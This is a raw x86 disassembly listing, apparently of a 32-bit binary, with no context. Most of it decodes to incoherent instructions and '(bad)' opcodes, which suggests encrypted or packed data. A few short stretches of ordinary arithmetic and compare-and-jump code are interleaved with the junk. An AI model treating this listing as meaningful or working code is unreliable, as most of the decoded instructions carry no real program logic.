  40b1d6:	xor    al,0xe
  40b1d8:	ret    
  40b1d9:	sahf   
  40b1da:	stos   DWORD PTR es:[edi],eax
  40b1db:	jle    0x40b1f6
  40b1dd:	pop    ecx
  40b1de:	fsubr  QWORD PTR [edx]
  40b1e0:	add    eax,0x99316873
  40b1e5:	mov    DWORD PTR [eax+0x4a994cf5],ebx
  40b1eb:	out    0xe6,eax
  40b1ed:	call   0xc490:0x4a3cfb61
  40b1f4:	pop    edx
  40b1f5:	dec    esi
  40b1f6:	ss aaa 
  40b1f8:	ja     0x40b256
  40b1fa:	mov    esi,0x2fa21082
  40b1ff:	sub    ah,BYTE PTR [edi+0x1fbb5be6]
  40b205:	push   ecx
  40b206:	ror    BYTE PTR [ebx+0x6e84569b],1
  40b20c:	sti    
  40b20d:	cmp    BYTE PTR [ecx+0x23],bl
  40b210:	scas   eax,DWORD PTR es:[edi]
  40b211:	push   esi
  40b212:	push   ebp
  40b213:	ss adc eax,0x78d8f554
  40b219:	xlat   BYTE PTR ds:[ebx]
  40b21a:	fld    DWORD PTR [ecx-0x2a]
  40b21d:	jle    0x40b214
  40b21f:	ds call 0x875fbf93
  40b225:	xchg   DWORD PTR [esi-0x77],ebx
  40b228:	not    BYTE PTR [edi]
  40b22a:	repz std 
  40b22c:	std    
  40b22d:	rcl    BYTE PTR [ebp+0x49],cl
  40b230:	jae    0x40b215
  40b232:	lahf   
  40b233:	stc    
  40b234:	inc    esi
  40b235:	adc    dl,BYTE PTR [esi+edi*8-0x24592697]
  40b23c:	mov    DWORD PTR [ebp+0x29bca95e],eax
  40b242:	repz xor esi,DWORD PTR [ebx-0x59]
  40b246:	jge    0x40b1cc
  40b248:	dec    edi
  40b249:	xchg   BYTE PTR [edx+0x50e01644],ah
  40b24f:	cli    
  40b250:	dec    ecx
  40b251:	mov    WORD PTR [edi-0xd],?
  40b254:	js     0x40b2c2
  40b256:	cmp    al,0x9a
  40b258:	lds    esi,FWORD PTR [eax+eiz*8-0x1da5021f]
  40b25f:	popa   
  40b260:	out    0xae,eax
  40b262:	mov    esp,0x3f97e377
  40b267:	mov    cs,eax
  40b269:	fdivr  st(0),st
  40b26b:	xchg   esi,eax
  40b26c:	iret   
  40b26d:	outs   dx,DWORD PTR ds:[esi]
  40b26e:	sbb    al,ah
  40b270:	or     al,cl
  40b272:	adc    eax,DWORD PTR [edx+ebx*8+0x444a5147]
  40b279:	cmp    ebp,DWORD PTR [edx+eax*1]
  40b27c:	and    ah,BYTE PTR ss:[eax-0xe39bb7b]
  40b283:	repnz sbb BYTE PTR ss:[esi-0x6],0xd3
  40b289:	mov    esi,DWORD PTR gs:[edx]
  40b28c:	fs mov cl,0x85
  40b28f:	xchg   eax,edi
  40b291:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b292:	push   esp
  40b293:	fld    TBYTE PTR [ecx+0x82c730]
  40b299:	mov    al,BYTE PTR [edi+0xd6176ed]
  40b29f:	pop    edi
  40b2a0:	add    esi,DWORD PTR [eax+0x1aeacea0]
  40b2a6:	ds ret 
  40b2a8:	pushf  
  40b2a9:	mov    ebx,edx
  40b2ab:	psubsw mm3,mm2
  40b2ae:	xor    al,BYTE PTR [eax-0x667a2f40]
  40b2b4:	lods   eax,DWORD PTR ds:[esi]
  40b2b5:	cdq    
  40b2b6:	add    dl,BYTE PTR [ecx]
  40b2b8:	push   es
  40b2b9:	(bad)  
  40b2ba:	int3   
  40b2bb:	xor    ebp,ebp
  40b2bd:	call   0x3cb5:0x8f0fa2e1
  40b2c4:	loope  0x40b30b
  40b2c6:	push   edi
  40b2c7:	repnz inc ebx
  40b2c9:	dec    edi
  40b2ca:	push   DWORD PTR [ebx-0x35fe9a8d]
  40b2d0:	fmul   st(2),st
  40b2d2:	pop    ss
  40b2d3:	or     al,0x9
  40b2d5:	ror    DWORD PTR [esp+edx*2+0x1bfbe20a],cl
  40b2dc:	jb     0x40b28b
  40b2de:	pop    ecx
  40b2df:	ret    0x89c6
  40b2e2:	out    0xa4,al
  40b2e4:	pop    edx
  40b2e5:	jp     0x40b32c
  40b2e7:	mov    esp,?
  40b2e9:	lock pop ecx
  40b2eb:	dec    esp
  40b2ec:	push   ecx
  40b2ed:	add    DWORD PTR [ebp+0x53],ebx
  40b2f0:	and    DWORD PTR [esi+0x58],ebp
  40b2f3:	cmp    BYTE PTR [ebx-0x33],0xda
  40b2f7:	sbb    dl,BYTE PTR [edx]
  40b2f9:	outs   dx,DWORD PTR ds:[esi]
  40b2fa:	cs xchg ebp,eax
  40b2fc:	or     BYTE PTR [esi-0x5817783e],bh
  40b302:	(bad)  
  40b303:	jne    0x40b30a
  40b305:	adc    eax,DWORD PTR [esi+0x34]
  40b308:	and    eax,0x4324c07e
  40b30d:	(bad)  
  40b30e:	lds    esp,FWORD PTR ds:0x69f4b0d7
  40b314:	xchg   edi,eax
  40b315:	xchg   edi,eax
  40b316:	sbb    esi,edi
  40b318:	jb     0x40b348
  40b31a:	mov    esi,0xaf74cf8c
  40b31f:	in     al,dx
  40b320:	or     al,0xe8
  40b322:	sbb    DWORD PTR [eax],esp
  40b324:	icebp  
  40b325:	xor    ah,ch
  40b327:	jge    0x40b35e
  40b329:	js     0x40b383
  40b32b:	cdq    
  40b32c:	jle    0x40b394
  40b32e:	enter  0x6f6a,0xa7
  40b332:	sbb    dh,al
  40b334:	xlat   BYTE PTR ds:[ebx]
  40b335:	ficomp DWORD PTR [eax+edi*8]
  40b338:	push   edi
  40b339:	pop    esi
  40b33a:	fdiv   st,st(7)
  40b33c:	sbb    cl,BYTE PTR [edx]
  40b33e:	shl    DWORD PTR [ecx+0x6d46bce],cl
  40b344:	mov    esp,DWORD PTR [ecx+0x47c05a58]
  40b34a:	sbb    eax,edx
  40b34c:	jo     0x40b360
  40b34e:	(bad)  
  40b34f:	adc    bx,bx
  40b352:	or     DWORD PTR [edi],ebx
  40b354:	mov    ah,0x59
  40b356:	add    eax,DWORD PTR ds:0x50ad6e2b
  40b35c:	stos   DWORD PTR es:[edi],eax
  40b35d:	pavgb  mm6,QWORD PTR [eax+0x1]
  40b361:	cmp    ebx,edx
  40b363:	ja     0x40b371
  40b369:	mov    edx,DWORD PTR [ebp-0x30]
  40b36c:	jmp    0x40baa7
  40b371:	mov    edx,DWORD PTR [ebp-0x38]
  40b374:	mov    edi,DWORD PTR [ebp-0x4]
  40b377:	xor    edx,eax
  40b379:	xor    edi,eax
  40b37b:	add    edi,ecx
  40b37d:	add    edx,ecx
  40b37f:	imul   edx,edi
  40b382:	mov    edi,DWORD PTR [ebp-0x8]
  40b385:	mov    ebx,DWORD PTR [ebp-0x10]
  40b388:	sub    ebx,edi
  40b38a:	cmp    ebx,edx
  40b38c:	ja     0x40b39a
  40b392:	mov    edx,DWORD PTR [ebp-0x34]
  40b395:	jmp    0x40baa7
  40b39a:	mov    edx,DWORD PTR [ebp-0x3c]
  40b39d:	mov    edi,DWORD PTR [ebp-0x4]
  40b3a0:	jmp    0x40b713
  40b3a5:	ret    0x2e25
  40b3a8:	dec    ebx
  40b3a9:	icebp  
  40b3aa:	dec    ebx
  40b3ab:	ins    DWORD PTR es:[edi],dx
  40b3ac:	mov    ebp,0x68a70588
  40b3b1:	add    eax,0x6182952a
  40b3b6:	cli    
  40b3b7:	jl     0x40b435
  40b3b9:	retf   0x7c79
  40b3bc:	jl     0x40b38e
  40b3be:	dec    ebx
  40b3bf:	ret    
  40b3c0:	pop    ds
  40b3c1:	ja     0x40b3e7
  40b3c3:	jl     0x40b3ed
  40b3c5:	xchg   esp,eax
  40b3c6:	nop
  40b3c7:	pusha  
  40b3c8:	das    
  40b3c9:	pop    ebx
  40b3ca:	inc    esi
  40b3cb:	or     DWORD PTR [ebp-0x2a9e044c],edi
  40b3d1:	xor    al,0xc
  40b3d3:	in     eax,0x72
  40b3d5:	repz mov edi,0x79e913d3
  40b3db:	or     al,0xfb
  40b3dd:	mov    eax,ds:0x617508ed
  40b3e2:	leave  
  40b3e3:	and    eax,0x9d00ec3a
  40b3e8:	les    esp,FWORD PTR [ebx+0x40]
  40b3eb:	sbb    esp,DWORD PTR [edx+0x39]
  40b3ee:	in     eax,0x50
  40b3f0:	and    ecx,0xfffffff4
  40b3f3:	aad    0x7b
  40b3f5:	mov    cl,BYTE PTR [edi]
  40b3f7:	and    dh,BYTE PTR [edi]
  40b3f9:	das    
  40b3fa:	lahf   
  40b3fb:	push   ebp
  40b3fc:	or     ebp,esi
  40b3fe:	bound  ebx,QWORD PTR [edi-0x74efdfba]
  40b404:	mov    ebp,0x7f622f93
  40b409:	add    DWORD PTR [ebx+0x12206dbb],edi
  40b40f:	stos   DWORD PTR es:[edi],eax
  40b410:	xor    DWORD PTR [edi+0x7caae86d],edx
  40b416:	mov    esi,0x43a4c397
  40b41b:	inc    esp
  40b41c:	pop    edi
  40b41d:	pop    edx
  40b41e:	jns    0x40b44c
  40b420:	mov    esi,0xc77aadbe
  40b425:	call   FWORD PTR [ebp+ebx*1-0x3a49d770]
  40b42c:	hlt    
  40b42d:	popf   
  40b42e:	pop    ebx
  40b42f:	ficom  DWORD PTR [edx]
  40b431:	mov    WORD PTR [edi],gs
  40b433:	cmp    edx,esp
  40b435:	add    DWORD PTR [ecx-0x4746575f],0xeae97717
  40b43f:	test   edx,edx
  40b441:	or     esi,esp
  40b443:	mov    ch,bl
  40b445:	lock rcl BYTE PTR ds:0xa4f07ddd,1
  40b44c:	sbb    edi,DWORD PTR [ebp-0xc]
  40b44f:	(bad)  
  40b450:	ficomp WORD PTR [ecx+0x7]
  40b453:	pop    ds
  40b454:	cdq    
  40b455:	pop    ebp
  40b456:	ret    
  40b457:	sar    BYTE PTR [ebx],cl
  40b459:	std    
  40b45a:	cs mov fs,edi
  40b45d:	ret    
  40b45e:	ret    
  40b45f:	mov    al,ds:0x417ac176
  40b464:	ins    DWORD PTR es:[edi],dx
  40b465:	mov    ds:0x34a33e75,eax
  40b46a:	fbld   TBYTE PTR cs:[ebx]
  40b46d:	or     al,0x21
  40b46f:	out    dx,al
  40b470:	cmovl  ecx,ebx
  40b473:	add    DWORD PTR [eax],ebx
  40b475:	mov    WORD PTR gs:[ebp+0x785e78b],ds
  40b47c:	out    0xb2,eax
  40b47e:	xor    DWORD PTR [edi+0x680fafe9],0x3a0b4702
  40b488:	dec    ebp
  40b489:	jmp    0xabee:0x4d37455e
  40b490:	out    0x63,eax
  40b492:	(bad)  
  40b493:	jmp    0x40b4de
  40b495:	jmp    0x40b464
  40b497:	mov    bl,0x4f
  40b499:	push   0x57
  40b49b:	test   BYTE PTR ds:0x33622bde,0x6c
  40b4a2:	push   ecx
  40b4a3:	pop    edi
  40b4a4:	fst    DWORD PTR [edx]
  40b4a6:	call   0x77e0:0x19708acf
  40b4ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b4ae:	imul   edi,DWORD PTR ds:0xf78cb8dc,0x6f
  40b4b5:	icebp  
  40b4b6:	and    eax,0xbfab5eb1
  40b4bb:	iret   
  40b4bc:	stos   BYTE PTR es:[edi],al
  40b4bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b4be:	and    ecx,DWORD PTR [ebx+0x10]
  40b4c1:	jne    0x40b51c
  40b4c3:	and    eax,0x56bfd61f
  40b4c8:	add    edx,DWORD PTR ss:[ebp+0xf]
  40b4cc:	in     eax,dx
  40b4cd:	lods   eax,DWORD PTR ds:[esi]
  40b4ce:	std    
  40b4cf:	or     esp,DWORD PTR [eax-0x17]
  40b4d2:	pop    ecx
  40b4d3:	scas   al,BYTE PTR es:[edi]
  40b4d4:	inc    esp
  40b4d5:	sub    ebx,DWORD PTR [ebx+0x56264435]
  40b4db:	jae    0x40b482
  40b4dd:	dec    ebp
  40b4df:	cmc    
  40b4e0:	adc    ebx,edx
  40b4e2:	xchg   esp,eax
  40b4e3:	ds sbb eax,0x2f389fd0
  40b4e9:	mov    cl,0x5f
  40b4eb:	push   edx
  40b4ec:	mov    bl,0xcf
  40b4ee:	(bad)  
  40b4ef:	mov    al,0x23
  40b4f1:	cdq    
  40b4f2:	in     eax,dx
  40b4f3:	cmp    ecx,DWORD PTR ds:0xeeae09f9
  40b4f9:	push   es
  40b4fa:	push   ecx
  40b4fb:	xchg   DWORD PTR [edi+0x6c11aa7e],edx
  40b501:	sahf   
  40b502:	add    eax,0xa4e0909
  40b507:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b508:	push   0x7afef63
  40b50d:	sbb    dl,BYTE PTR [esi-0x35]
  40b510:	jb     0x40b556
  40b512:	mov    WORD PTR [edx],es
  40b514:	add    eax,0x3a19b9aa
  40b519:	jmp    0x40b50f
  40b51b:	xor    bl,BYTE PTR [edx]
  40b51d:	push   ecx
  40b51e:	shl    BYTE PTR [esi],0xef
  40b521:	sub    eax,0xab61acec
  40b526:	xor    eax,0x76df4576
  40b52b:	mov    BYTE PTR [ecx-0x385dbf91],bl
  40b531:	xchg   BYTE PTR [eax+0xa],bh
  40b534:	iret   
  40b535:	in     eax,0xce
  40b537:	int    0xed
  40b539:	pop    edx
  40b53a:	inc    esp
  40b53b:	push   eax
  40b53c:	bound  ebp,QWORD PTR [ebx+0x36]
  40b53f:	aas    
  40b540:	es (bad) 
  40b542:	es dec esi
  40b544:	and    bl,BYTE PTR [esi]
  40b546:	push   ecx
  40b547:	mov    eax,ds:0x7551ad5d
  40b54c:	pop    esp
  40b54d:	call   0x8edb:0x78e9303f
  40b554:	inc    eax
  40b555:	push   edi
  40b556:	repz xor dl,bh
  40b559:	aaa    
  40b55a:	inc    edx
  40b55b:	out    dx,al
  40b55c:	and    ebx,edi
  40b55e:	jbe    0x40b525
  40b560:	into   
  40b561:	mov    ebp,0x152663fb
  40b566:	jns    0x40b59a
  40b568:	iret   
  40b569:	aas    
  40b56a:	add    eax,0xe9bbbed2
  40b56f:	sti    
  40b570:	ror    BYTE PTR [eax-0x67885ee1],1
  40b576:	inc    edx
  40b577:	adc    al,0x8a
  40b579:	js     0x40b508
  40b57b:	lods   eax,DWORD PTR ds:[esi]
  40b57c:	jns    0x40b54e
  40b57e:	xchg   ebp,eax
  40b57f:	xlat   BYTE PTR ds:[ebx]
  40b580:	jle    0x40b511
  40b582:	in     eax,dx
  40b583:	xchg   ebp,eax
  40b584:	mul    BYTE PTR [ebx+0x54]
  40b587:	(bad)  
  40b588:	mov    edi,0xba07bcb0
  40b58d:	data16 jne 0x40b51c
  40b590:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b591:	xchg   edx,eax
  40b592:	jmp    DWORD PTR [eax+0x2e]
  40b595:	push   ds
  40b596:	or     al,0x2c
  40b598:	cmp    edx,0x5a
  40b59b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b59c:	push   ebp
  40b59d:	pop    ecx
  40b59e:	lea    edi,[ebp+0x2299872a]
  40b5a4:	sahf   
  40b5a5:	imul   edi,ebp,0xf0b4d180
  40b5ab:	in     al,0x4b
  40b5ad:	push   0x2ba9aae0
  40b5b2:	add    dh,cl
  40b5b4:	paddq  mm4,QWORD PTR [ebp-0x27]
  40b5b8:	retf   
  40b5b9:	mov    es,edx
  40b5bb:	out    dx,eax
  40b5bc:	retf   
  40b5bd:	in     al,dx
  40b5be:	jg     0x40b54d
  40b5c0:	shr    DWORD PTR [ebp+0x537cc859],1
  40b5c6:	aad    0xd9
  40b5c8:	xor    eax,0x5fc92810
  40b5cd:	mov    WORD PTR [edi+0x63],es
  40b5d0:	fs mov al,0xe7
  40b5d3:	out    0x92,eax
  40b5d5:	repz xchg edi,eax
  40b5d7:	or     al,0xf7
  40b5d9:	hlt    
  40b5da:	cdq    
  40b5db:	push   ds
  40b5dc:	popf   
  40b5dd:	mov    ebp,0xeb25b68d
  40b5e2:	inc    esp
  40b5e3:	xchg   esi,eax
  40b5e4:	jne    0x40b631
  40b5e6:	jo     0x40b58b
  40b5e8:	shl    BYTE PTR [ebx],cl
  40b5ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b5eb:	jl     0x40b5c0
  40b5ed:	or     ecx,DWORD PTR [ebx+0x2754c89e]
  40b5f3:	mov    cl,0x7f
  40b5f5:	ficom  DWORD PTR [ebx]
  40b5f7:	jp     0x40b623
  40b5f9:	jle    0x40b5b9
  40b5fb:	icebp  
  40b5fc:	inc    esp
  40b5fd:	ret    0x4ed8
  40b600:	int3   
  40b601:	mov    bh,0x57
  40b603:	gs inc edi
  40b605:	and    BYTE PTR ds:0x2785a74,0x29
  40b60c:	fild   DWORD PTR [edi+0x20965f4c]
  40b612:	not    BYTE PTR ds:0xb2e87a66
  40b618:	adc    bl,cl
  40b61a:	ins    DWORD PTR es:[edi],dx
  40b61b:	adc    eax,edi
  40b61d:	imul   eax,DWORD PTR [edx-0x3d],0xb4378d7d
  40b624:	scas   al,BYTE PTR es:[edi]
  40b625:	dec    edx
  40b626:	shl    BYTE PTR [eax],0xaf
  40b629:	push   esi
  40b62a:	popf   
  40b62b:	es das 
  40b62d:	test   DWORD PTR [ecx+esi*8],ecx
  40b630:	neg    BYTE PTR [esi-0x3d]
  40b633:	aam    0x73
  40b635:	mov    esp,0xaae281b5
  40b63a:	pop    esp
  40b63b:	(bad)  
  40b63c:	out    dx,al
  40b63d:	jp     0x40b5c9
  40b63f:	inc    esi
  40b640:	sbb    DWORD PTR [ebp-0x4e],ebp
  40b643:	push   0x9
  40b645:	mov    esp,0x8b51db49
  40b64a:	pop    es
  40b64b:	ja     0x40b638
  40b64d:	test   eax,0x8f77a9ea
  40b652:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  40b654:	cmp    DWORD PTR ds:0x82f45177,esi
  40b65a:	out    0x9a,al
  40b65c:	adc    BYTE PTR [ecx],cl
  40b65e:	jmp    0x40b695
  40b660:	mov    esp,ebp
  40b662:	dec    eax
  40b663:	pop    ebp
  40b664:	push   esp
  40b665:	push   0xaafd98ea
  40b66a:	repz lock cmc 
  40b66d:	adc    al,BYTE PTR [ebx+0x2797146f]
  40b673:	and    BYTE PTR [ecx],cl
  40b675:	push   edi
  40b676:	(bad)  [ebp-0x32400794]
  40b67c:	shl    DWORD PTR [ebx+ebp*1+0x44be9958],0xb
  40b684:	test   al,0x6b
  40b686:	nop
  40b687:	add    al,0x3b
  40b689:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b68a:	mov    ch,0x20
  40b68c:	mov    DWORD PTR [edi],edi
  40b68e:	push   cs
  40b68f:	sub    edi,esi
  40b691:	outs   dx,DWORD PTR ds:[esi]
  40b692:	mov    WORD PTR [esi],es
  40b694:	fldenv [esi]
  40b696:	cld    
  40b697:	outs   dx,BYTE PTR ds:[esi]
  40b698:	push   es
  40b699:	mov    al,ds:0x26d46c44
  40b69e:	mov    al,ds:0x859b7a18
  40b6a3:	outs   dx,DWORD PTR ds:[esi]
  40b6a4:	adc    DWORD PTR [ecx+0x17],ebx
  40b6a7:	cmc    
  40b6a8:	and    eax,0x70efd1f5
  40b6ad:	mov    ecx,0x230a3977
  40b6b2:	fwait
  40b6b3:	(bad)  
  40b6b4:	sbb    ebp,DWORD PTR [ecx+edx*2]
  40b6b7:	mov    esp,0xd352bf9e
  40b6bc:	sar    DWORD PTR ds:0x304b7c9d,cl
  40b6c2:	mov    DWORD PTR [ecx-0x667da447],ecx
  40b6c8:	sub    al,0xe7
  40b6ca:	scas   al,BYTE PTR es:[edi]
  40b6cb:	loop   0x40b683
  40b6cd:	pop    edi
  40b6ce:	loopne 0x40b700
  40b6d0:	and    DWORD PTR [esi+0x42],eax
  40b6d3:	adc    al,0x3d
  40b6d5:	or     eax,DWORD PTR [edi]
  40b6d7:	push   ss
  40b6d8:	cmp    eax,0x66f36b37
  40b6dd:	add    ch,dl
  40b6df:	stc    
  40b6e0:	(bad)  
  40b6e1:	loope  0x40b757
  40b6e3:	adc    al,BYTE PTR [esi-0x42ee9be7]
  40b6e9:	pop    ebx
  40b6ea:	jb     0x40b6a0
  40b6ec:	xor    al,al
  40b6ee:	and    edx,DWORD PTR [edi+0x43ca0a92]
  40b6f4:	pop    ecx
  40b6f5:	mov    ds:0xf4331bc3,al
  40b6fa:	push   edi
  40b6fb:	or     ebp,ecx
  40b6fd:	jmp    0xa081:0x2947c974
  40b704:	push   esi
  40b705:	pop    edx
  40b706:	cmp    edx,edi
  40b708:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b709:	pop    ds
  40b70a:	and    dl,ch
  40b70c:	iret   
  40b70d:	test   WORD PTR [eax+edx*8+0x1d],cx
  40b712:	sub    BYTE PTR [ebx],dh
  40b714:	shl    BYTE PTR [ebx],1
  40b716:	clc    
  40b717:	add    edx,ecx
  40b719:	add    edi,ecx
  40b71b:	imul   edx,edi
  40b71e:	mov    edi,DWORD PTR [ebp-0x8]
  40b721:	mov    ebx,DWORD PTR [ebp-0x10]
  40b724:	sub    ebx,edi
  40b726:	cmp    ebx,edx
  40b728:	mov    edx,DWORD PTR [ebp-0x38]
  40b72b:	jbe    0x40baa7
  40b731:	jmp    0x40baa4
  40b736:	dec    ecx
  40b737:	mov    cl,0xec
  40b739:	cwde   
  40b73a:	hlt    
  40b73b:	ins    DWORD PTR es:[edi],dx
  40b73c:	push   ebp
  40b73d:	jge    0x40b6d6
  40b73f:	loop   0x40b70e
  40b741:	loope  0x40b739
  40b743:	and    ebx,0x17
  40b746:	aas    
  40b747:	xchg   BYTE PTR [esp+edi*2-0x36],bh
  40b74b:	jns    0x40b7c9
  40b74d:	jl     0x40b780
  40b74f:	dec    edi
  40b750:	mov    edx,0xce79887f
  40b755:	ds mov dh,0xc0
  40b758:	push   0x253b651a
  40b75d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b75e:	(bad)  
  40b75f:	ds and eax,0xe66dd6c0
  40b765:	gs in  eax,0xea
  40b768:	popf   
  40b769:	test   DWORD PTR [edx],esi
  40b76b:	mov    WORD PTR [edi],es
  40b76d:	movq   mm3,mm3
  40b770:	icebp  
  40b771:	mov    WORD PTR [eax+ebp*2+0x5a5b8f30],es
  40b778:	inc    ecx
  40b779:	jle    0x40b79e
  40b77b:	jmp    0x172e273d
  40b780:	ror    DWORD PTR [eax+0x4c2dd37],1
  40b786:	cwde   
  40b787:	cmp    eax,0x14a35b83
  40b78c:	cmc    
  40b78d:	dec    edi
  40b78e:	xor    cl,bl
  40b790:	mov    ebx,0x44cdf9d8
  40b795:	in     eax,0xee
  40b797:	pop    edx
  40b798:	pop    esp
  40b799:	arpl   WORD PTR [edx+0x62e35bdb],bp
  40b79f:	retf   
  40b7a0:	repnz mov ah,0xf0
  40b7a3:	test   dl,bh
  40b7a5:	hlt    
  40b7a6:	sbb    bh,BYTE PTR [esi-0x2c98e6f]
  40b7ac:	jbe    0x40b75b
  40b7ae:	lahf   
  40b7af:	mov    bl,0xbf
  40b7b1:	es xor eax,0xed933ffa
  40b7b7:	mov    WORD PTR [edi-0x2f],cs
  40b7ba:	add    esi,DWORD PTR [ecx-0x78]
  40b7bd:	ss scas eax,DWORD PTR es:[edi]
  40b7bf:	mov    esp,0xcba4ab6
  40b7c4:	popa   
  40b7c5:	push   ss
  40b7c6:	push   0xffffff8c
  40b7c8:	lds    edi,FWORD PTR [edx+0x6d]
  40b7cb:	pop    edx
  40b7cc:	xchg   esi,eax
  40b7cd:	mov    eax,0x36e1f017
  40b7d2:	gs push ds
  40b7d4:	(bad)  
  40b7d5:	pop    ebx
  40b7d6:	inc    ecx
  40b7d7:	xor    eax,0x632abfdc
  40b7dc:	xor    DWORD PTR [edi-0x4e],ecx
  40b7df:	aas    
  40b7e0:	push   0x4e1558a7
  40b7e5:	or     dh,bh
  40b7e7:	in     eax,dx
  40b7e8:	xor    al,0xc5
  40b7ea:	jmp    0x90c767d9
  40b7ef:	sub    al,BYTE PTR [edx+0x4e65b8b3]
  40b7f5:	sub    ebp,0x5cc73f1e
  40b7fb:	sub    BYTE PTR [eax],dl
  40b7fd:	shr    DWORD PTR [esi+0x276de194],cl
  40b803:	xchg   ecx,eax
  40b804:	xor    BYTE PTR [ebx-0x53],ah
  40b807:	std    
  40b808:	cmp    DWORD PTR [ebp-0x4f],edi
  40b80b:	int    0x2c
  40b80d:	dec    ecx
  40b80e:	dec    edx
  40b80f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b810:	cmp    esi,edi
  40b812:	mov    ds:0x3a5c7161,eax
  40b817:	sar    BYTE PTR [ebx+ecx*2+0xb],0x25
  40b81c:	cli    
  40b81d:	push   ecx
  40b81e:	scas   eax,DWORD PTR es:[edi]
  40b81f:	(bad)  
  40b820:	stc    
  40b821:	jo     0x40b7fd
  40b823:	ret    
  40b824:	rcl    BYTE PTR [edi-0x5ef4e307],0x44
  40b82b:	xchg   esp,eax
  40b82c:	pop    esp
  40b82d:	dec    eax
  40b82e:	test   al,0x6f
  40b830:	mov    ch,0x70
  40b832:	pop    bp
  40b834:	repz repz jg 0x40b820
  40b838:	adc    al,0x22
  40b83a:	mov    al,0x9a
  40b83c:	sub    edx,esp
  40b83e:	test   al,0xe9
  40b840:	ds popf 
  40b842:	cmp    eax,0x70ad8e60
  40b847:	mov    ds:0x51258152,al
  40b84c:	pushf  
  40b84d:	sbb    esp,0xffffffaa
  40b850:	stc    
  40b851:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b852:	mov    bl,0x29
  40b854:	cmp    DWORD PTR [ecx],esi
  40b856:	setne  BYTE PTR [edi+0x7b]
  40b85a:	retf   
  40b85b:	in     eax,dx
  40b85c:	add    dh,BYTE PTR [edx-0x160cece4]
  40b862:	icebp  
  40b863:	les    edx,FWORD PTR [edx]
  40b865:	aam    0x29
  40b867:	pusha  
  40b868:	les    ebp,FWORD PTR [ecx+0x20]
  40b86b:	aas    
  40b86c:	daa    
  40b86d:	mov    eax,ds:0xcf0b5473
  40b872:	and    al,0x2f
  40b874:	jno    0x40b88f
  40b876:	aas    
  40b877:	lods   al,BYTE PTR ds:[esi]
  40b878:	mov    edx,0x6f705b9f
  40b87d:	cmp    DWORD PTR [ebp+0x58],edx
  40b880:	cmp    eax,0xd9322fb0
  40b885:	pop    es
  40b886:	push   0xa3b2273c
  40b88b:	lock or DWORD PTR [edi+0x75c45dd2],0xffffff90
  40b893:	inc    edx
  40b894:	and    ebx,ebx
  40b896:	loope  0x40b8a9
  40b898:	sbb    cl,ah
  40b89a:	out    0xe5,al
  40b89c:	test   DWORD PTR ds:0xfce64dc1,esi
  40b8a2:	jnp    0x40b8ae
  40b8a4:	xor    eax,0x50e9f064
  40b8a9:	test   BYTE PTR [edx-0x37],al
  40b8ac:	mov    ah,0x5a
  40b8ae:	out    dx,eax
  40b8af:	add    ebp,DWORD PTR [edx-0x88f1c2f]
  40b8b5:	cmp    eax,0x783e120
  40b8ba:	fisttp QWORD PTR [eax+0x186faf29]
  40b8c0:	cmp    eax,0x12e3ec10
  40b8c5:	sbb    eax,0x942ccee
  40b8ca:	imul   edi,DWORD PTR [edi+ebp*8],0xa2c2f04f
  40b8d1:	(bad)  
  40b8d2:	cld    
  40b8d3:	fpatan 
  40b8d5:	shl    ecx,cl
  40b8d7:	push   ebx
  40b8d8:	(bad)  
  40b8d9:	lods   al,BYTE PTR ds:[esi]
  40b8da:	mov    eax,0x9fe3e502
  40b8df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b8e0:	int    0x3a
  40b8e2:	jnp    0x40b909
  40b8e4:	adc    eax,0xc00f0b2f
  40b8e9:	aas    
  40b8ea:	fs (bad) 
  40b8ec:	lods   eax,DWORD PTR ds:[esi]
  40b8ed:	inc    edx
  40b8ee:	pop    ebx
  40b8ef:	je     0x40b871
  40b8f1:	std    
  40b8f2:	(bad)  
  40b8f3:	sub    BYTE PTR ds:0x713d7f1f,bh
  40b8f9:	jae    0x40b8fa
  40b8fb:	push   esi
  40b8fc:	sbb    ch,BYTE PTR [ecx+0x4bb7897e]
  40b902:	sub    esi,0xb88d7e83
  40b908:	shl    DWORD PTR [esi-0x502daddc],cl
  40b90e:	inc    ecx
  40b90f:	jnp    0x40b8a0
  40b911:	sub    BYTE PTR [edi+0x66b91f8d],ch
  40b917:	and    ebx,DWORD PTR [esi]
  40b919:	xchg   esi,eax
  40b91a:	jns    0x40b8ff
  40b91c:	loopne 0x40b978
  40b91e:	out    0x99,eax
  40b920:	jmp    0x91e1:0x858630e0
  40b927:	sti    
  40b928:	push   0xffffff82
  40b92a:	cmp    BYTE PTR [edx],bl
  40b92c:	dec    esp
  40b92d:	sub    al,0xd5
  40b92f:	in     al,dx
  40b930:	or     al,0x10
  40b932:	pop    es
  40b933:	ja     0x40b8de
  40b935:	xchg   esp,eax
  40b936:	cmc    
  40b937:	std    
  40b938:	mov    edx,0x89083adb
  40b93d:	push   0xc93a8523
  40b942:	aas    
  40b943:	or     DWORD PTR [edx-0x1d],ecx
  40b946:	pop    ebp
  40b947:	sti    
  40b948:	sbb    al,0x97
  40b94a:	jnp    0x40b905
  40b94c:	icebp  
  40b94d:	jnp    0x40b8cf
  40b94f:	lock aad 0x67
  40b952:	ss fwait
  40b954:	inc    esi
  40b955:	leave  
  40b956:	ret    0xd39e
  40b959:	loopne 0x40b9a1
  40b95b:	test   al,0xa0
  40b95d:	out    dx,eax
  40b95e:	int    0xaa
  40b960:	or     al,0x95
  40b962:	daa    
  40b963:	cmp    bl,BYTE PTR [esi-0x5e]
  40b966:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b967:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b968:	stos   BYTE PTR es:[edi],al
  40b969:	dec    edx
  40b96a:	push   0x68
